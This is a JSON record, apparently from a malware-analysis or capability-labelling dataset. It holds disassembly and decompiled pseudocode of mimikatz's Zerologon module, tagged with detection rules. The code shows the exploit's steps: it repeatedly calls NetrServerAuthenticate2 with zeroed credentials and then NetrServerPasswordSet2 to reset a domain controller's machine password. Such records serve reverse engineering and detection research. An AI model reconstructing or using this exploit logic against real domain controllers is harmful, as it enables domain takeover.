{
  "address": "0x1400a556c",
  "rules": [
    "check for time delay via GetTickCount/dcdc41ab318e4e618f624ba5aeac30b2",
    "contain loop"
  ],
  "disassembly": [
    "mov     qword [rsp+0x8 {__saved_rbx}], rbx",
    "mov     qword [rsp+0x10 {__saved_rsi}], rsi",
    "push    rdi {__saved_rdi}",
    "push    r12 {__saved_r12}",
    "push    r13 {__saved_r13}",
    "push    r14 {__saved_r14}",
    "push    r15 {__saved_r15}",
    "sub     rsp, 0x2d0",
    "mov     rdi, rdx",
    "mov     r12d, ecx",
    "xor     ebx, ebx  {0x0}",
    "mov     byte [rsp+0x78 {var_280}], bl  {0x0}",
    "xor     eax, eax  {0x0}",
    "mov     dword [rsp+0x79 {var_27f}], eax  {0x0}",
    "mov     word [rsp+0x7d {var_27b}], ax  {0x0}",
    "mov     byte [rsp+0x7f {var_279}], al  {0x0}",
    "mov     dword [rsp+0x80 {var_278}], ebx  {0x0}",
    "mov     dword [rsp+0x90 {var_268}], 0x212fffff",
    "mov     word [rsp+0xc0 {var_238}], bx  {0x0}",
    "xor     edx, edx  {0x0}",
    "mov     r8d, 0x1fe",
    "lea     rcx, [rsp+0xc2 {var_236}]",
    "call    memset",
    "mov     dword [rsp+0x2c0 {var_38}], ebx  {0x0}",
    "lea     r13d, [rbx+0x6]",
    "mov     r14d, ebx  {0x0}",
    "mov     dword [rsp+0x74 {var_284}], ebx  {0x0}",
    "mov     esi, ebx  {0x0}",
    "mov     dword [rsp+0x70 {var_288}], ebx  {0x0}",
    "mov     qword [rsp+0x20 {var_2d8}], rbx  {0x0}",
    "lea     r9, [rsp+0x88 {var_270}]",
    "lea     r8, [rel data_140110500]  {u\"account\"}",
    "mov     rdx, rdi",
    "mov     ecx, r12d",
    "call    sub_140013220",
    "cmp     eax, ebx",
    "je      0x1400a5a04",
    "lea     rcx, [rel data_140112350]  {u\"ERROR kuhl_m_lsadump_zerologon ;\u2026\"}",
    "call    sub_14000c030",
    "mov     qword [rsp+0x20 {var_2d8}], rbx  {0x0}",
    "lea     r9, [rsp+0x310 {ws}]",
    "lea     r8, [rel data_140102a28]  {u\"type\"}",
    "mov     rdx, rdi",
    "mov     ecx, r12d",
    "call    sub_140013220",
    "cmp     eax, ebx",
    "je      0x1400a5648",
    "mov     qword [rsp+0x20 {var_2d8}], rbx  {0x0}",
    "xor     r9d, r9d  {0x0}",
    "lea     r8, [rel data_140111d50]  {u\"exploit\"}",
    "mov     rdx, rdi",
    "mov     ecx, r12d",
    "call    sub_140013220",
    "mov     r15d, eax",
    "mov     dword [rsp+0x94 {var_264_1}], eax",
    "mov     dword [rsp+0x60 {var_298_1}], 0x1",
    "mov     qword [rsp+0x58 {var_2a0_1}], rbx  {0x0}",
    "mov     qword [rsp+0x50 {var_2a8}], rbx  {0x0}",
    "lea     rax, [rsp+0x310 {ws}]",
    "mov     qword [rsp+0x48 {var_2b0_1}], rax {ws}",
    "mov     dword [rsp+0x40 {var_2b8}], ebx  {0x0}",
    "lea     rax, [rsp+0x318 {arg_20}]",
    "mov     qword [rsp+0x38 {var_2c0_1}], rax {arg_20}",
    "mov     qword [rsp+0x30 {var_2c8_1}], rbx  {0x0}",
    "mov     qword [rsp+0x28 {var_2d0}], rbx  {0x0}",
    "mov     qword [rsp+0x20 {var_2d8}], rbx  {0x0}",
    "lea     r9, [rsp+0xa8 {var_250}]",
    "lea     r8, [rsp+0xa0 {var_258}]",
    "mov     rdx, rdi",
    "mov     ecx, r12d",
    "call    sub_140010594",
    "cmp     r13d, 0x8",
    "jae     0x1400a56dc",
    "xor     r8d, r8d  {0x0}",
    "xor     edx, edx  {0x0}",
    "mov     rcx, qword [rsp+0x310 {ws}]",
    "call    qword [rel wcstoul]",
    "mov     r13d, eax",
    "lea     rcx, [rel data_1400e17c8]",
    "movsxd  rax, r13d",
    "lea     rcx, [rel data_14013c420]",
    "mov     rcx, qword [rcx+rax*8]",
    "jmp     0x1400a56e3",
    "xor     eax, eax  {0x0}",
    "lea     r11, [rsp+0x2d0 {__saved_r15}]",
    "mov     rbx, qword [r11+0x30 {__saved_rbx}]",
    "mov     rsi, qword [r11+0x38 {__saved_rsi}]",
    "mov     rsp, r11",
    "pop     r15 {__saved_r15}",
    "pop     r14 {__saved_r14}",
    "pop     r13 {__saved_r13}",
    "pop     r12 {__saved_r12}",
    "pop     rdi {__saved_rdi}",
    "retn     {__return_addr}",
    "lea     rdx, [rel data_1400dd6c0]",
    "mov     rcx, qword [rel data_1401403e0]",
    "call    qword [rel RpcEpResolveBinding]",
    "cmp     eax, ebx",
    "jne     0x1400a59ec",
    "lea     rax, [rel data_140111d60]  {u\"detect\"}",
    "cmp     r15d, ebx",
    "lea     rdx, [rel data_140111d50]",
    "cmovne  rax, rdx  {data_140111d50, u\"exploit\"}",
    "mov     qword [rsp+0x28 {var_2d0}], rax",
    "mov     qword [rsp+0x20 {var_2d8_1}], rcx",
    "mov     r9d, r13d",
    "mov     r8, qword [rsp+0x88 {var_270}]",
    "mov     rdx, qword [rsp+0xa0 {var_258}]",
    "lea     rcx, [rel data_140111d70]  {u\"\\nTarget : %s\\nAccount: %s\\nType\u2026\"}",
    "call    sub_14000c030",
    "mov     r11d, dword [rsp+0x310 {ws}]",
    "lea     rcx, [rel data_1400df898]",
    "neg     r11d",
    "sbb     rax, rax",
    "and     rax, rcx",
    "mov     qword [rsp+0x50 {var_2a8_1}], rbx  {0x0}",
    "lea     r12, [rel data_1401403e0]",
    "mov     qword [rsp+0x48 {var_2b0}], r12  {data_1401403e0}",
    "mov     dword [rsp+0x40 {var_2b8_1}], ebx  {0x0}",
    "mov     qword [rsp+0x38 {var_2c0_2}], rax",
    "mov     eax, dword [rsp+0x318 {arg_20}]",
    "mov     dword [rsp+0x30 {var_2c8_1}], eax",
    "mov     dword [rsp+0x28 {var_2d0}], 0x1",
    "lea     rax, [rel data_140111de0]",
    "mov     qword [rsp+0x20 {var_2d8}], rax  {data_140111de0}",
    "xor     r9d, r9d  {0x0}",
    "mov     r8, qword [rsp+0xa0 {var_258}]",
    "mov     rdx, qword [rsp+0xa8 {var_250}]",
    "xor     ecx, ecx  {0x0}",
    "call    sub_140010274",
    "cmp     eax, ebx",
    "je      0x1400a5a10",
    "mov     edx, eax",
    "lea     rcx, [rel data_1401122d0]  {u\"ERROR kuhl_m_lsadump_zerologon ;\u2026\"}",
    "call    sub_14000c030",
    "lea     rcx, [rel data_140111de8]  {u\"Trying to 'authenticate'...\\n\"}",
    "call    sub_14000c030",
    "nop     ",
    "mov     edi, ebx  {0x0}",
    "mov     dword [rsp+0x98 {var_260_1}], ebx  {0x0}",
    "lea     rcx, [rel data_1400e5b78]  {u\"mimikatz\"}",
    "jmp     0x1400a59a4",
    "lea     rax, [rsp+0xb0 {var_248}]",
    "mov     qword [rsp+0x28 {var_2d0_1}], rax {var_248}",
    "lea     rax, [rsp+0x78 {var_280}]",
    "mov     qword [rsp+0x20 {var_2d8_2}], rax {var_280}",
    "mov     r9, rcx  {data_1400e5b78, u\"mimikatz\"}",
    "xor     r8d, r8d  {0x0}",
    "lea     rdx, [rel data_1400dd852]",
    "lea     rcx, [rel data_1400dd7a0]",
    "call    NdrClientCall2",
    "cmp     eax, ebx",
    "jne     0x1400a5969",
    "lea     rax, [rel data_1401121e0]",
    "lea     rdx, [rel data_140112208]  {u\"KO -- maybe not vulnerable\"}",
    "cmp     r14d, ebx",
    "cmovne  rdx, rax  {data_1401121e0, u\"OK -- vulnerable\"}",
    "lea     rcx, [rel data_140112240]  {u\"\\n\\n* Authentication: %s\\n\"}",
    "call    sub_14000c030",
    "cmp     r15d, ebx",
    "je      0x1400a59fa",
    "mov     edx, eax",
    "lea     rcx, [rel data_1401120e0]  {u\"ERROR kuhl_m_lsadump_zerologon ;\u2026\"}",
    "call    sub_14000c030",
    "lea     rax, [rsp+0x90 {var_268}]",
    "mov     qword [rsp+0x40 {var_2b8_1}], rax {var_268}",
    "lea     rax, [rsp+0xb0 {var_248}]",
    "mov     qword [rsp+0x38 {var_2c0_2}], rax {var_248}",
    "lea     rax, [rsp+0x78 {var_280}]",
    "mov     qword [rsp+0x30 {var_2c8_1}], rax {var_280}",
    "lea     rax, [rel data_1400e5b78]  {u\"mimikatz\"}",
    "mov     qword [rsp+0x28 {var_2d0}], rax  {data_1400e5b78, u\"mimikatz\"}",
    "mov     dword [rsp+0x20 {var_2d8_2}], r13d",
    "mov     r9, qword [rsp+0x88 {var_270}]",
    "xor     r8d, r8d  {0x0}",
    "lea     rdx, [rel data_1400dd890]",
    "lea     rcx, [rel data_1400dd7a0]",
    "call    NdrClientCall2",
    "cmp     eax, ebx",
    "jne     0x1400a5918",
    "mov     rcx, r12  {data_1401403e0}",
    "call    sub_140010484",
    "jmp     0x1400a5a10",
    "lea     rax, [rel data_140112270]",
    "lea     rdx, [rel data_1400f9e10]",
    "cmp     esi, ebx",
    "cmovne  rdx, rax  {data_140112270, u\"OK -- may be unstable\"}",
    "lea     rcx, [rel data_1401122a0]  {u\"* Set password  : %s\\n\"}",
    "call    sub_14000c030",
    "jmp     0x1400a59fa",
    "mov     ecx, 0xc000018b",
    "cmp     eax, ecx",
    "jne     0x1400a5931",
    "mov     edi, 0x1",
    "mov     r14d, edi  {0x1}",
    "mov     dword [rsp+0x74 {var_284_1}], edi  {0x1}",
    "xor     edx, edx  {0x0}",
    "lea     rcx, [rel data_140111e30]  {u\"\\n\\n  NetrServerAuthenticate2: 0\u2026\"}",
    "call    sub_14000c030",
    "cmp     r15d, ebx",
    "je      0x1400a5977",
    "cmp     eax, 0xc0000022",
    "je      0x1400a5948",
    "mov     edx, ecx  {0xc000018b}",
    "lea     rcx, [rel data_140111f50]  {u\"ERROR kuhl_m_lsadump_zerologon ;\u2026\"}",
    "call    sub_14000c030",
    "jmp     0x1400a5977",
    "lea     rcx, [rel data_1400d27a8]",
    "call    sub_14000c030",
    "lea     r11, [rsp+0xc0 {var_238}]",
    "mov     qword [rsp+0x40 {var_2b8_1}], r11 {var_238}",
    "lea     rax, [rsp+0xb0 {var_248}]",
    "mov     qword [rsp+0x38 {var_2c0_3}], rax {var_248}",
    "lea     rax, [rsp+0x78 {var_280}]",
    "mov     qword [rsp+0x30 {var_2c8_2}], rax {var_280}",
    "lea     rax, [rel data_1400e5b78]  {u\"mimikatz\"}",
    "mov     qword [rsp+0x28 {var_2d0}], rax  {data_1400e5b78, u\"mimikatz\"}",
    "mov     dword [rsp+0x20 {var_2d8_2}], r13d",
    "mov     r9, qword [rsp+0x88 {var_270}]",
    "xor     r8d, r8d  {0x0}",
    "lea     rdx, [rel data_1400dd8e0]",
    "lea     rcx, [rel data_1400dd7a0]",
    "call    NdrClientCall2",
    "cmp     eax, ebx",
    "jne     0x1400a5908",
    "lea     rcx, [rel data_1401056ec]",
    "call    sub_14000c030",
    "inc     edi",
    "mov     dword [rsp+0x98 {i_1}], edi",
    "lea     rcx, [rel data_1400e5b78]  {u\"mimikatz\"}",
    "jmp     0x1400a57cd",
    "mov     edx, eax",
    "lea     rcx, [rel data_140112050]  {u\"ERROR kuhl_m_lsadump_zerologon ;\u2026\"}",
    "call    sub_14000c030",
    "jmp     0x1400a5977",
    "mov     edx, eax",
    "lea     rcx, [rel data_140111ed0]  {u\"ERROR kuhl_m_lsadump_zerologon ;\u2026\"}",
    "call    sub_14000c030",
    "jmp     0x1400a5977",
    "mov     esi, edi  {0x1}",
    "mov     dword [rsp+0x70 {var_288_1}], edi  {0x1}",
    "xor     edx, edx  {0x0}",
    "lea     rcx, [rel data_140111e80]  {u\"  NetrServerPasswordSet2 : 0x%08\u2026\"}",
    "call    sub_14000c030",
    "jmp     0x1400a5977",
    "cmp     edi, 0x7d0",
    "jae     0x1400a5977"
  ],
  "high_level_IL": [
    "char var_280 = 0",
    "int32_t var_27f = 0",
    "int16_t var_27b = 0",
    "char var_279 = 0",
    "int32_t var_278 = 0",
    "int32_t var_268 = 0x212fffff",
    "int16_t var_238 = 0",
    "void var_236",
    "memset(&var_236, 0, 0x1fe)",
    "int32_t var_38 = 0",
    "uint32_t r13 = 6",
    "int32_t r14 = 0",
    "int32_t var_284 = 0",
    "int32_t rsi = 0",
    "int32_t var_288 = 0",
    "int64_t var_270",
    "int32_t rax",
    "int64_t rdx_1",
    "rax, rdx_1 = sub_140013220(arg1, arg2, u\"account\", &var_270, nullptr)",
    "if (rax == 0)",
    "sub_14000c030(u\"ERROR kuhl_m_lsadump_zerologon ;\u2026\", rdx_1)",
    "if (sub_140013220(arg1, arg2, u\"type\", &ws, nullptr) != 0)",
    "r13 = wcstoul(ws, nullptr, 0)",
    "int32_t rax_3 = sub_140013220(arg1, arg2, u\"exploit\", nullptr, nullptr)",
    "int32_t var_264_1 = rax_3",
    "int32_t var_298_1 = 1",
    "int64_t var_2a0_1 = 0",
    "char* var_2c8_1 = nullptr",
    "void* var_258",
    "int64_t var_250",
    "sub_140010594(arg1, arg2, &var_258, &var_250, nullptr, nullptr, nullptr, &arg_20, nullptr, &ws, nullptr)",
    "void* const rcx_6",
    "if (r13 u>= 8)",
    "rcx_6 = &data_1400e17c8",
    "rcx_6 = (&data_14013c420)[sx.q(r13)]",
    "void* const var_2d8_1 = rcx_6",
    "int64_t rax_5 = sub_14000c030(u\"\\nTarget : %s\\nAccount: %s\\nType\u2026\", var_258)",
    "int64_t var_2a8_1 = 0",
    "int32_t var_2b8_1 = 0",
    "void* var_2c0_2 = sbb.q(rax_5, rax_5, ws.d != 0) & &data_1400df898",
    "var_2c8_1.d = arg_20",
    "if (sub_140010274(0, var_250, var_258, nullptr, 0x40111de0, 1, var_2c8_1, var_2c0_2.d, nullptr, &data_1401403e0) != 0)",
    "int32_t rax_10",
    "int64_t rdx_7",
    "rax_10, rdx_7 = RpcEpResolveBinding(data_1401403e0, &data_1400dd6c0)",
    "if (rax_10 != 0)",
    "sub_14000c030(u\"ERROR kuhl_m_lsadump_zerologon ;\u2026\", zx.q(rax_10))",
    "sub_14000c030(u\"Trying to 'authenticate'...\\n\", rdx_7)",
    "int32_t i = 0",
    "int32_t var_260_1 = 0",
    "while (i u< 0x7d0)",
    "void var_248",
    "int32_t rax_11 = NdrClientCall2(&data_1400dd7a0, &data_1400dd852, 0, u\"mimikatz\", &var_280, &var_248, var_2c8_1, var_2c0_2, var_2b8_1)",
    "if (rax_11 != 0)",
    "sub_14000c030(u\"ERROR kuhl_m_lsadump_zerologon ;\u2026\", zx.q(rax_11))",
    "break",
    "var_2b8_1.q = &var_268",
    "var_2c0_2 = &var_248",
    "var_2c8_1 = &var_280",
    "char* var_2d8_2",
    "var_2d8_2.d = r13",
    "int32_t rax_12",
    "int64_t rdx_8",
    "rax_12, rdx_8 = NdrClientCall2(&data_1400dd7a0, &data_1400dd890, 0, var_270, var_2d8_2, u\"mimikatz\", var_2c8_1, var_2c0_2, var_2b8_1)",
    "if (rax_12 == 0)",
    "r14 = 1",
    "int32_t var_284_1 = 1",
    "int64_t rdx_9 = sub_14000c030(u\"\\n\\n  NetrServerAuthenticate2: 0\u2026\", 0)",
    "if (rax_3 != 0)",
    "sub_14000c030(U\"\\n\", rdx_9)",
    "var_2b8_1.q = &var_238",
    "var_2d8_2.d = r13",
    "int32_t rax_13 = NdrClientCall2(&data_1400dd7a0, &data_1400dd8e0, 0, var_270, var_2d8_2, u\"mimikatz\", &var_280, &var_248, var_2b8_1)",
    "if (rax_13 != 0)",
    "sub_14000c030(u\"ERROR kuhl_m_lsadump_zerologon ;\u2026\", zx.q(rax_13))",
    "rsi = 1",
    "int32_t var_288_1 = 1",
    "sub_14000c030(u\"  NetrServerPasswordSet2 : 0x%08\u2026\", 0)",
    "break",
    "if (rax_12 == 0xc000018b)",
    "sub_14000c030(u\"ERROR kuhl_m_lsadump_zerologon ;\u2026\", 0xc000018b)",
    "break",
    "if (rax_12 != 0xc0000022)",
    "sub_14000c030(u\"ERROR kuhl_m_lsadump_zerologon ;\u2026\", zx.q(rax_12))",
    "break",
    "sub_14000c030(U\"=|\", rdx_8)",
    "i += 1",
    "int32_t i_1 = i",
    "wchar16 const* const rdx_13 = u\"KO -- maybe not vulnerable\"",
    "if (r14 != 0)",
    "rdx_13 = u\"OK -- vulnerable\"",
    "sub_14000c030(u\"\\n\\n* Authentication: %s\\n\", rdx_13)",
    "if (rax_3 != 0)",
    "void* const rdx_14 = &data_1400f9e10",
    "if (rsi != 0)",
    "rdx_14 = u\"OK -- may be unstable\"",
    "sub_14000c030(u\"* Set password  : %s\\n\", rdx_14)",
    "sub_140010484(&data_1401403e0)",
    "return 0"
  ]
}